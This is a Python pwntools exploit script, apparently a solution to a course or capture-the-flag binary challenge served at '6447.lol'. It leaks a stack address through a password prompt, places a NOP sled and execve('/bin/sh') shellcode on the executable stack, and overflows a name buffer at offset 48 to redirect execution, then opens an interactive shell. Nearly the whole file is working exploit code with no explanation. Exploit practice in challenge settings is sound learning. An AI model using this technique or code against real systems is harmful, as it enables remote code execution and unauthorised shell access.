#!/usr/bin/env python3

# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 4004

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E, LIBC
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")
        LIBC = ELF("/lib/x86_64-linux-gnu/libc.so.6")


######################################
############## Exploit ###############
######################################

def runner(send):
    P.recvuntil(b'[q]uit', drop=True)
    if(send in ['s', 'v', 'p', 'c', 'q']):
        P.sendline(send.encode())

shellcode = asm(
    "push 0x68\n"                 
    "mov rax, 0x68732f2f6e69622f\n"  
    "push rax\n"                  
    "mov rdi, rsp\n"              
    "xor esi, esi\n"              
    "push rsi\n"                  
    "mov rsi, rsp\n"              
    "xor edx, edx\n"              
    "push 0x3b\n"                 
    "pop rax\n"                   
    "syscall\n"                   
)

context.arch = "amd64"
shellcode = asm(shellcraft.amd64.linux.sh())


def set_name():
    runner('s')
    offset_from_rbp = 48 # found using cyclic
    payload = b'A' * offset_from_rbp + p64(0x0) + p64(STACK_POINTER)
    log.info(f"Sending payload of length {len(payload)}: {payload}")
    P.sendline(payload)

def enter_password():
    global STACK_POINTER
    runner('p')
    P.recvline()
    filler = b'\x90'
    n_filler = 0x54 - len(shellcode) - 1
    payload = filler * n_filler + shellcode
    log.info(f"Sending payload of length {len(payload)}: {payload}")
    P.sendline(payload)
    P.recvuntil(b'offset ', drop=True)
    STACK_POINTER = int(P.recvline()[:-1], 16)
    log.info("Stack pointer: %x" % (STACK_POINTER))
    
def exploit():
    connect_binary()
    enter_password()
    set_name()
    P.interactive()

if __name__ == '__main__':
    exploit()
